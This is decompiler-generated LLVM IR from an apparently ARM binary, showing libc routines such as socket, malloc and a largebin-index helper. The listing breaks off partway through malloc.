define i32 @"$d.4"(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_e398:
  %v0_e398 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e398, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e398
  %v2_e398 = load i32, i32* @r6, align 4
  %v5_e398 = udiv i32 %v2_e398, 4
  %v6_e398 = and i32 %v5_e398, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e398, %bb
  %v12_e39c = phi i32 [ %arg1, %dec_label_pc_e398 ], [ %v6_e398, %bb ]
  ret i32 %v12_e39c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e3a0 = load i32, i32* @r7, align 4
  store i32 %v3_e3a0, i32* %stack_var_-8, align 4
  %v0_e3ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e3ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_e3ac, -4095
  br i1 %tmp, label %dec_label_pc_e3d4, label %dec_label_pc_e3bc

dec_label_pc_e3bc:                                ; preds = %entry
  %v0_e3c0 = call i32 @__aeabi_read_tp()
  %v3_e3c4 = load i16, i16* @global_var_23164.175, align 2
  %v4_e3c4 = sext i16 %v3_e3c4 to i32
  %v0_e3c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e3c8 = sub i32 0, %v0_e3c8
  store i32 %v1_e3c8, i32* %r2.global-to-local, align 4
  %v3_e3cc = add i32 %v4_e3c4, %v0_e3c0
  %v4_e3cc = inttoptr i32 %v3_e3cc to i32*
  store i32 %v1_e3c8, i32* %v4_e3cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_e3d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %entry, %dec_label_pc_e3bc
  %v1_e3d8 = phi i32 [ %v0_e3ac, %entry ], [ -1, %dec_label_pc_e3bc ]
  %v2_e3d4 = phi i32 [ %v3_e3a0, %entry ], [ %v2_e3d4.pre, %dec_label_pc_e3bc ]
  store i32 %v2_e3d4, i32* @r7, align 4
  ret i32 %v1_e3d8

; uselistorder directives
  uselistorder i32 %v0_e3ac, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3d4, { 1, 0 }
}

define i32 @"$d.3"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e3dc:
  %v0_e3dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e3dc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e3dc
  %v2_e3dc = load i32, i32* @sb, align 4
  %v8_e3dc = shl i32 %v2_e3dc, %arg2
  %v9_e3dc = and i32 %v8_e3dc, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e3dc, %bb
  %v4_e3e0 = phi i32 [ %arg1, %dec_label_pc_e3dc ], [ %v9_e3dc, %bb ]
  ret i32 %v4_e3e0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_e3e4 = udiv i32 %arg1, 256
  store i32 %v3_e3e4, i32* %r1.global-to-local, align 4
  %v2_e3e8 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_e3e8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_e3f4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_e3e8, i32 %v0_e3f4)
  %v0_e3f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_e3f8 = add i32 %v0_e3f8, 1048320
  %v3_e3fc = udiv i32 %v1_e3f8, 65536
  %v1_e400 = and i32 %v3_e3fc, 8
  %v6_e404 = shl i32 %v0_e3f8, %v1_e400
  %v1_e408 = add i32 %v6_e404, 520192
  %v3_e40c = udiv i32 %v1_e408, 65536
  %v1_e410 = and i32 %v3_e40c, 4
  %v6_e414 = shl i32 %v6_e404, %v1_e410
  %v1_e418 = add i32 %v6_e414, 245760
  %v3_e41c = udiv i32 %v1_e418, 65536
  %v1_e420 = and i32 %v3_e41c, 2
  %v6_e424 = shl i32 %v6_e414, %v1_e420
  store i32 %v6_e424, i32* %r1.global-to-local, align 4
  %v1_e428 = sub nsw i32 13, %v1_e400
  %v2_e42c = sub nsw i32 %v1_e428, %v1_e410
  %v3_e430 = udiv i32 %v6_e424, 32768
  %v4_e430 = sub nuw nsw i32 -1, %v3_e430
  %v4_e434 = udiv i32 %v6_e424, 16384
  %v5_e434 = and i32 %v4_e434, %v4_e430
  %v2_e438 = sub nsw i32 %v2_e42c, %v1_e420
  %v2_e43c = add nsw i32 %v2_e438, %v5_e434
  %v1_e440 = add nsw i32 %v2_e43c, 6
  %v0_e444 = load i32, i32* %ip.global-to-local, align 4
  %v6_e444 = lshr i32 %v0_e444, %v1_e440
  %v3_e448 = mul nsw i32 %v2_e43c, 4
  %v1_e44c = add nsw i32 %v3_e448, 32
  %v1_e450 = urem i32 %v6_e444, 4
  %v2_e454 = or i32 %v1_e450, %v1_e44c
  ret i32 %v2_e454

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_e45c = load i32, i32* @r4, align 4
  %v6_e45c = load i32, i32* @r5, align 4
  %v9_e45c = load i32, i32* @r6, align 4
  %v12_e45c = load i32, i32* @r7, align 4
  %v15_e45c = load i32, i32* @r8, align 4
  %v18_e45c = load i32, i32* @sb, align 4
  %v21_e45c = load i32, i32* @sl, align 4
  %v24_e45c = load i32, i32* @fp, align 4
  %v27_e45c = load i32, i32* @lr, align 4
  store i32 116, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  %v4_e470 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 116) to i32*), align 4
  store i32 %v4_e470, i32* %r4.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_e47c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 72) to i32*), align 4
  store i32 %v4_e47c, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %v4_e470, i32* %r2.global-to-local, align 4
  %v2_e488 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_e488, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  %v4_e494 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 120) to i32*), align 4
  store i32 %v4_e494, i32* %ip.global-to-local, align 4
  store i32 58528, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_e494)
  %v0_e4a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e4a0, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* @r1, align 4
  %v4_e4ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 16) to i32*), align 4
  store i32 %v4_e4ac, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_e4b8.319 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_e4ac)
  %v0_e4b8 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_e4b8, -32
  br i1 %tmp, label %dec_label_pc_e4dc, label %dec_label_pc_e4c0

dec_label_pc_e4c0:                                ; preds = %entry
  store i32 85140, i32* %r2.global-to-local, align 4
  %v0_e4c4 = call i32 @__aeabi_read_tp()
  store i32 %v0_e4c4, i32* %r0.global-to-local, align 4
  %v3_e4c8 = load i16, i16* @global_var_23164.175, align 2
  %v4_e4c8 = sext i16 %v3_e4c8 to i32
  store i32 %v4_e4c8, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_e4d4 = add i32 %v4_e4c8, %v0_e4c4
  %v4_e4d4 = inttoptr i32 %v3_e4d4 to i32*
  store i32 12, i32* %v4_e4d4, align 4
  br label %dec_label_pc_ed60

dec_label_pc_e4dc:                                ; preds = %entry
  %v1_e4dc = add i32 %v0_e4b8, 11
  store i32 %v1_e4dc, i32* %r0.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v2_e4e8 = icmp ugt i32 %v1_e4dc, 14
  %v7_e4e8 = icmp eq i32 %v1_e4dc, 15
  %v2_e4ec = xor i1 %v7_e4e8, true
  %v3_e4ec = and i1 %v2_e4e8, %v2_e4ec
  br i1 %v3_e4ec, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_e4dc
  %v5_e4ec = and i32 %v1_e4dc, -8
  store i32 %v5_e4ec, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_e4dc, %bb
  %v4_e4f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_e4f0, i32* @r0, align 4
  %v1_e4f4 = inttoptr i32 %v4_e4f0 to i32*
  %v2_e4f4 = load i32, i32* %v1_e4f4, align 4
  store i32 %v2_e4f4, i32* @r4, align 4
  %v2_e4f8 = xor i1 %v2_e4e8, true
  %v3_e4f8 = or i1 %v7_e4e8, %v2_e4f8
  br i1 %v3_e4f8, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_e4fc = urem i32 %v2_e4f4, 2
  %v2_e4fc = icmp eq i32 %v1_e4fc, 0
  br i1 %v2_e4fc, label %dec_label_pc_e504, label %dec_label_pc_e514

dec_label_pc_e504:                                ; preds = %bb140
  %v2_e504 = icmp eq i32 %v2_e4f4, 0
  br i1 %v2_e504, label %dec_label_pc_e50c, label %dec_label_pc_e8f0

dec_label_pc_e50c:                                ; preds = %dec_label_pc_e504
  %v0_e50c = call i32 @__malloc_consolidate()
  store i32 %v0_e50c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e8f0

dec_label_pc_e514:                                ; preds = %bb140
  %v0_e514 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_e514, %v2_e4f4
  br i1 %tmp201, label %dec_label_pc_e53c, label %dec_label_pc_e51c

dec_label_pc_e51c:                                ; preds = %dec_label_pc_e514
  %v1_e51c = add i32 %v4_e4f0, -4
  store i32 %v1_e51c, i32* %r1.global-to-local, align 4
  %v3_e520 = udiv i32 %v0_e514, 8
  store i32 %v3_e520, i32* %r2.global-to-local, align 4
  %v4_e524 = mul nuw i32 %v3_e520, 4
  %v5_e524 = add i32 %v4_e524, %v1_e51c
  %v6_e524 = inttoptr i32 %v5_e524 to i32*
  %v7_e524 = load i32, i32* %v6_e524, align 4
  store i32 %v7_e524, i32* %r0.global-to-local, align 4
  %v2_e528 = icmp eq i32 %v7_e524, 0
  br i1 %v2_e528, label %dec_label_pc_e53c, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e51c
  %v2_e52c = add i32 %v7_e524, 8
  %v3_e52c = inttoptr i32 %v2_e52c to i32*
  %v4_e52c = load i32, i32* %v3_e52c, align 4
  store i32 %v4_e52c, i32* %r3.global-to-local, align 4
  store i32 %v2_e52c, i32* %r0.global-to-local, align 4
  store i32 %v2_e52c, i32* %r4.global-to-local, align 4
  store i32 %v4_e52c, i32* %v6_e524, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e53c:                                ; preds = %dec_label_pc_e51c, %dec_label_pc_e514
  %tmp202 = icmp ugt i32 %v0_e514, 255
  br i1 %tmp202, label %dec_label_pc_e58c, label %dec_label_pc_e544

dec_label_pc_e544:                                ; preds = %dec_label_pc_e53c
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_e54c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  %v3_e550 = udiv i32 %v0_e514, 8
  store i32 %v3_e550, i32* @r7, align 4
  %v4_e554 = mul nuw i32 %v3_e550, 8
  %v5_e554 = add i32 %v4_e54c, %v4_e554
  store i32 %v5_e554, i32* %r3.global-to-local, align 4
  %v1_e558 = add i32 %v5_e554, 44
  store i32 %v1_e558, i32* %ip.global-to-local, align 4
  %v1_e55c = add i32 %v5_e554, 56
  %v2_e55c = inttoptr i32 %v1_e55c to i32*
  %v3_e55c = load i32, i32* %v2_e55c, align 4
  store i32 %v3_e55c, i32* %r0.global-to-local, align 4
  %v9_e560 = icmp eq i32 %v3_e55c, %v1_e558
  br i1 %v9_e560, label %dec_label_pc_e6ec, label %dec_label_pc_e568

dec_label_pc_e568:                                ; preds = %dec_label_pc_e544
  %v2_e568 = add i32 %v3_e55c, %v0_e514
  store i32 %v2_e568, i32* %r3.global-to-local, align 4
  %v1_e56c = add i32 %v2_e568, 4
  %v2_e56c = inttoptr i32 %v1_e56c to i32*
  %v3_e56c = load i32, i32* %v2_e56c, align 4
  store i32 %v3_e56c, i32* %r2.global-to-local, align 4
  %v1_e570 = add i32 %v3_e55c, 12
  %v2_e570 = inttoptr i32 %v1_e570 to i32*
  %v3_e570 = load i32, i32* %v2_e570, align 4
  store i32 %v3_e570, i32* %r1.global-to-local, align 4
  %v1_e574 = or i32 %v3_e56c, 1
  store i32 %v1_e574, i32* %r2.global-to-local, align 4
  %v1_e578 = add i32 %v3_e55c, 8
  store i32 %v1_e578, i32* %r4.global-to-local, align 4
  store i32 %v1_e574, i32* %v2_e56c, align 4
  %v0_e580 = load i32, i32* %ip.global-to-local, align 4
  %v1_e580 = load i32, i32* %r1.global-to-local, align 4
  %v2_e580 = add i32 %v1_e580, 8
  %v3_e580 = inttoptr i32 %v2_e580 to i32*
  store i32 %v0_e580, i32* %v3_e580, align 4
  %v0_e584 = load i32, i32* %r1.global-to-local, align 4
  %v1_e584 = load i32, i32* %ip.global-to-local, align 4
  %v2_e584 = add i32 %v1_e584, 12
  %v3_e584 = inttoptr i32 %v2_e584 to i32*
  store i32 %v0_e584, i32* %v3_e584, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e53c
  store i32 %v0_e514, i32* %r0.global-to-local, align 4
  %v1_e590 = call i32 @__malloc_largebin_index(i32 %v0_e514)
  store i32 %v1_e590, i32* %r0.global-to-local, align 4
  %v0_e594 = load i32, i32* @r4, align 4
  %v1_e594 = and i32 %v0_e594, 2
  %v2_e594 = icmp eq i32 %v1_e594, 0
  store i32 %v1_e590, i32* @r7, align 4
  br i1 %v2_e594, label %dec_label_pc_e6ec, label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %dec_label_pc_e58c
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r1.global-to-local, align 4
  %v4_e5a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23104.179 to i32), i32 68) to i32*), align 4
  store i32 %v4_e5a8, i32* @r0, align 4
  %v0_e5ac = call i32 @__malloc_consolidate()
  store i32 %v0_e5ac, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e6ec

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e700
  %v1_e5b4 = add i32 %v3_e700, 4
  %v2_e5b4 = inttoptr i32 %v1_e5b4 to i32*
  %v3_e5b4 = load i32, i32* %v2_e5b4, align 4
  store i32 %v3_e5b4, i32* %r3.global-to-local, align 4
  %v0_e5b8 = load i32, i32* @sl, align 4
  %v1_e5bc = and i32 %v3_e5b4, -4
  store i32 %v1_e5bc, i32* %r4.global-to-local, align 4
  %v1_e5c0 = add i32 %v3_e700, 12
  %v2_e5c0 = inttoptr i32 %v1_e5c0 to i32*
  %v3_e5c0 = load i32, i32* %v2_e5c0, align 4
  store i32 %v3_e5c0, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_e5b8, 255
  br i1 %tmp203, label %dec_label_pc_e61c, label %dec_label_pc_e5c8

dec_label_pc_e5c8:                                ; preds = %dec_label_pc_e5b4
  %v9_e5c8 = icmp eq i32 %v3_e5c0, %v0_e620
  br i1 %v9_e5c8, label %dec_label_pc_e5d0, label %dec_label_pc_e61c

dec_label_pc_e5d0:                                ; preds = %dec_label_pc_e5c8
  %v0_e5d0 = load i32, i32* @sb, align 4
  %v1_e5d0 = add i32 %v0_e5d0, 48
  %v2_e5d0 = inttoptr i32 %v1_e5d0 to i32*
  %v3_e5d0 = load i32, i32* %v2_e5d0, align 4
  store i32 %v3_e5d0, i32* %r3.global-to-local, align 4
  %v9_e5d4 = icmp eq i32 %v3_e700, %v3_e5d0
  br i1 %v9_e5d4, label %dec_label_pc_e5dc, label %dec_label_pc_e61c

dec_label_pc_e5dc:                                ; preds = %dec_label_pc_e5d0
  %v1_e5dc = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_e5bc, %v1_e5dc
  br i1 %tmp204, label %dec_label_pc_e5e4, label %dec_label_pc_e61c

dec_label_pc_e5e4:                                ; preds = %dec_label_pc_e5dc
  %v2_e5e4 = sub i32 %v1_e5bc, %v0_e5b8
  store i32 %v2_e5e4, i32* %r2.global-to-local, align 4
  %v2_e5e8 = add i32 %v0_e5b8, %v3_e700
  store i32 %v2_e5e8, i32* %r3.global-to-local, align 4
  %v1_e5ec = or i32 %v0_e5b8, 1
  store i32 %v1_e5ec, i32* %r0.global-to-local, align 4
  %v1_e5f0 = or i32 %v2_e5e4, 1
  store i32 %v1_e5f0, i32* %r1.global-to-local, align 4
  %v1_e5f4 = add i32 %v3_e700, 8
  store i32 %v1_e5f4, i32* %r4.global-to-local, align 4
  %v2_e5f8 = add i32 %v0_e620, 8
  %v3_e5f8 = inttoptr i32 %v2_e5f8 to i32*
  store i32 %v2_e5e8, i32* %v3_e5f8, align 4
  %v0_e5fc = load i32, i32* %r3.global-to-local, align 4
  %v1_e5fc = load i32, i32* %ip.global-to-local, align 4
  %v2_e5fc = add i32 %v1_e5fc, 12
  %v3_e5fc = inttoptr i32 %v2_e5fc to i32*
  store i32 %v0_e5fc, i32* %v3_e5fc, align 4
  %v0_e600 = load i32, i32* %r0.global-to-local, align 4
  %v1_e600 = load i32, i32* @r6, align 4
  %v2_e600 = add i32 %v1_e600, 4
  %v3_e600 = inttoptr i32 %v2_e600 to i32*
  store i32 %v0_e600, i32* %v3_e600, align 4
  %v0_e604 = load i32, i32* %r3.global-to-local, align 4
  %v1_e604 = load i32, i32* @sb, align 4
  %v2_e604 = add i32 %v1_e604, 48
  %v3_e604 = inttoptr i32 %v2_e604 to i32*
  store i32 %v0_e604, i32* %v3_e604, align 4
  %v0_e608 = load i32, i32* %r2.global-to-local, align 4
  %v1_e608 = load i32, i32* %r3.global-to-local, align 4
  %v3_e608 = add i32 %v1_e608, %v0_e608
  %v4_e608 = inttoptr i32 %v3_e608 to i32*
  store i32 %v0_e608, i32* %v4_e608, align 4
  %v0_e60c = load i32, i32* %r1.global-to-local, align 4
  %v1_e60c = load i32, i32* %r3.global-to-local, align 4
  %v2_e60c = add i32 %v1_e60c, 4
  %v3_e60c = inttoptr i32 %v2_e60c to i32*
  store i32 %v0_e60c, i32* %v3_e60c, align 4
  %v0_e610 = load i32, i32* %ip.global-to-local, align 4
  %v1_e610 = load i32, i32* %r3.global-to-local, align 4
  %v2_e610 = add i32 %v1_e610, 12
  %v3_e610 = inttoptr i32 %v2_e610 to i32*
  store i32 %v0_e610, i32* %v3_e610, align 4
  %v0_e614 = load i32, i32* %ip.global-to-local, align 4
  %v1_e614 = load i32, i32* %r3.global-to-local, align 4
  %v2_e614 = add i32 %v1_e614, 8
  %v3_e614 = inttoptr i32 %v2_e614 to i32*
  store i32 %v0_e614, i32* %v3_e614, align 4
  br label %dec_label_pc_ed44

dec_label_pc_e61c:                                ; preds = %dec_label_pc_e5dc, %dec_label_pc_e5d0, %dec_label_pc_e5c8, %dec_label_pc_e5b4
  %v9_e61c = icmp eq i32 %v1_e5bc, %v0_e5b8
  %v2_e620 = add i32 %v3_e5c0, 8
  %v3_e620 = inttoptr i32 %v2_e620 to i32*
  store i32 %v0_e620, i32* %v3_e620, align 4
  %v0_e624 = load i32, i32* %ip.global-to-local, align 4
  %v1_e624 = load i32, i32* %r5.global-to-local, align 4
  %v2_e624 = add i32 %v1_e624, 12
  %v3_e624 = inttoptr i32 %v2_e624 to i32*
  store i32 %v0_e624, i32* %v3_e624, align 4
  br i1 %v9_e61c, label %dec_label_pc_e77c.loopexit, label %dec_label_pc_e638

dec_label_pc_e638:                                ; preds = %dec_label_pc_e61c
  %v0_e638 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_e638, 255
  br i1 %tmp205, label %dec_label_pc_e65c, label %dec_label_pc_e640

dec_label_pc_e640:                                ; preds = %dec_label_pc_e638
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v1_e644 = load i32, i32* %r8.global-to-local, align 4
  %v2_e644 = add i32 %v1_e644, ptrtoint (i32* @global_var_23104.179 to i32)
  %v3_e644 = inttoptr i32 %v2_e644 to i32*
  %v4_e644 = load i32, i32* %v3_e644, align 4
  %v3_e648 = udiv i32 %v0_e638, 8
  store i32 %v3_e648, i32* %r0.global-to-local, align 4
  %v4_e64c = mul nuw i32 %v3_e648, 8
  %v5_e64c = add i32 %v4_e644, %v4_e64c
  store i32 %v5_e64c, i32* %r3.global-to-local, align 4
  %v1_e650 = add i32 %v5_e64c, 44
  store i32 %v1_e650, i32* %ip.global-to-local, align 4
  %v1_e654 = add i32 %v5_e64c, 52
  %v2_e654 = inttoptr i32 %v1_e654 to i32*
  %v3_e654 = load i32, i32* %v2_e654, align 4
  store i32 %v3_e654, i32* @lr, align 4
  br label %dec_label_pc_e6b4

dec_label_pc_e65c:                                ; preds = %dec_label_pc_e638
  store i32 %v0_e638, i32* %r0.global-to-local, align 4
  %v1_e660 = call i32 @__malloc_largebin_index(i32 %v0_e638)
  store i32 %v1_e660, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %ip.global-to-local, align 4
  %v1_e668 = load i32, i32* %r8.global-to-local, align 4
  %v2_e668 = add i32 %v1_e668, ptrtoint (i32* @global_var_23104.179 to i32)
  %v3_e668 = inttoptr i32 %v2_e668 to i32*
  %v4_e668 = load i32, i32* %v3_e668, align 4
  %v4_e66c = mul i32 %v1_e660, 8
  %v5_e66c = add i32 %v4_e668, %v4_e66c
  store i32 %v5_e66c, i32* %r3.global-to-local, align 4
  %v1_e670 = add i32 %v5_e66c, 44
  store i32 %v1_e670, i32* %ip.global-to-local, align 4
  %v1_e674 = add i32 %v5_e66c, 52
  %v2_e674 = inttoptr i32 %v1_e674 to i32*
  %v3_e674 = load i32, i32* %v2_e674, align 4
  store i32 %v3_e674, i32* @lr, align 4
  %v9_e678 = icmp eq i32 %v3_e674, %v1_e670
  br i1 %v9_e678, label %dec_label_pc_e6b4, label %dec_label_pc_e680

dec_label_pc_e680:                                ; preds = %dec_label_pc_e65c
  %v1_e680 = add i32 %v5_e66c, 56
  %v2_e680 = inttoptr i32 %v1_e680 to i32*
  %v3_e680 = load i32, i32* %v2_e680, align 4
  store i32 %v3_e680, i32* %r1.global-to-local, align 4
  %v1_e684 = add i32 %v3_e680, 4
  %v2_e684 = inttoptr i32 %v1_e684 to i32*
  %v3_e684 = load i32, i32* %v2_e684, align 4
  store i32 %v3_e684, i32* %r3.global-to-local, align 4
  %v0_e688 = load i32, i32* %r4.global-to-local, align 4
  %v3_e688 = icmp ult i32 %v0_e688, %v3_e684
  br i1 %v3_e688, label %.thread, label %dec_label_pc_e6a4.preheader

.thread:                                          ; preds = %dec_label_pc_e680
  store i32 %v1_e670, i32* @lr, align 4
  store i32 %v3_e680, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e6b4

dec_label_pc_e6a4.preheader:                      ; preds = %dec_label_pc_e680
  %v2_e690 = or i32 %v0_e688, 1
  store i32 %v2_e690, i32* %r2.global-to-local, align 4
  %v1_e6a4179 = add i32 %v3_e674, 4
  %v2_e6a4180 = inttoptr i32 %v1_e6a4179 to i32*
  %v3_e6a4181 = load i32, i32* %v2_e6a4180, align 4
  store i32 %v3_e6a4181, i32* %r3.global-to-local, align 4
  %v3_e6a8183 = icmp ult i32 %v2_e690, %v3_e6a4181
  br i1 %v3_e6a8183, label %dec_label_pc_e6a0, label %dec_label_pc_e6b0

dec_label_pc_e6a0:                                ; preds = %dec_label_pc_e6a4.preheader, %dec_label_pc_e6a0
  %v0_e6b0184 = phi i32 [ %v3_e6a0, %dec_label_pc_e6a0 ], [ %v3_e674, %dec_label_pc_e6a4.preheader ]
  %v1_e6a0 = add i32 %v0_e6b0184, 8
  %v2_e6a0 = inttoptr i32 %v1_e6a0 to i32*
  %v3_e6a0 = load i32, i32* %v2_e6a0, align 4
  store i32 %v3_e6a0, i32* @lr, align 4
  %v1_e6a4 = add i32 %v3_e6a0, 4
  %v2_e6a4 = inttoptr i32 %v1_e6a4 to i32*
  %v3_e6a4 = load i32, i32* %v2_e6a4, align 4
  store i32 %v3_e6a4, i32* %r3.global-to-local, align 4
  %v3_e6a8 = icmp ult i32 %v2_e690, %v3_e6a4
  br i1 %v3_e6a8, label %dec_label_pc_e6a0, label %dec_label_pc_e6b0

dec_label_pc_e6b0:                                ; preds = %dec_label_pc_e6a0, %dec_label_pc_e6a4.preheader
  %v0_e6b0.lcssa = phi i32 [ %v3_e674, %dec_label_pc_e6a4.preheader ], [ %v3_e6a0, %dec_label_pc_e6a0 ]
  %v1_e6b0 = add i32 %v0_e6b0.lcssa, 12
  %v2_e6b0 = inttoptr i32 %v1_e6b0 to i32*
  %v3_e6b0 = load i32, i32* %v2_e6b0, align 4
  store i32 %v3_e6b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_e6b4

dec_label_pc_e6b4:                                ; preds = %.thread, %dec_label_pc_e65c, %dec_label_pc_e640, %dec_label_pc_e6b0
  %v0_e6d4 = phi i32 [ %v1_e670, %dec_label_pc_e65c ], [ %v1_e650, %dec_label_pc_e640 ], [ %v3_e6b0, %dec_label_pc_e6b0 ], [ %v3_e680, %.thread ]
  %v0_e6c8 = phi i32 [ %v1_e660, %dec_label_pc_e65c ], [ %v3_e648, %dec_label_pc_e640 ], [ %v1_e660, %dec_label_pc_e6b0 ], [ %v1_e660, %.thread ]
  %v1_e6b8 = phi i32 [ %v1_e668, %dec_label_pc_e65c ], [ %v1_e644, %dec_label_pc_e640 ], [ %v1_e668, %dec_label_pc_e6b0 ], [ %v1_e668, %.thread ]
  store i32 ptrtoint (i32* @global_var_23104.179 to i32), i32* %r2.global-to-local, align 4
  %v2_e6b8 = add i32 %v1_e6b8, ptrtoint (i32* @global_var_23104.179 to i32)
  %v3_e6b8 = inttoptr i32 %v2_e6b8 to i32*
  %v4_e6b8 = load i32, i32* %v3_e6b8, align 4
  %v3_e6bc = sdiv i32 %v0_e6c8, 32
  store i32 %v3_e6bc, i32* %r3.global-to-local, align 4
  %v4_e6c0 = mul nsw i32 %v3_e6bc, 4
  %v5_e6c0 = add i32 %v4_e6b8, %v4_e6c0
  store i32 %v5_e6c0, i32* %r1.global-to-local, align 4
  %v1_e6c4 = add i32 %v5_e6c0, 820
  %v2_e6c4 = inttoptr i32 %v1_e6c4 to i32*
  %v3_e6c4 = load i32, i32* %v2_e6c4, align 4
  %v1_e6c8 = urem i32 %v0_e6c8, 32
  store i32 %v1_e6c8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_e6d0 = shl i32 1, %v1_e6c8
  %v8_e6d0 = or i32 %v3_e6c4, %v7_e6d0
  store i32 %v8_e6d0, i32* %r3.global-to-local, align 4
  %v1_e6d4 = load i32, i32* @r6, align 4
  %v2_e6d4 = add i32 %v1_e6d4, 12
  %v3_e6d4 = inttoptr i32 %v2_e6d4 to i32*
  store i32 %v0_e6d4, i32* %v3_e6d4, align 4
  %v0_e6d8 = load i32, i32* @lr, align 4
  %v1_e6d8 = load i32, i32* @r6, align 4
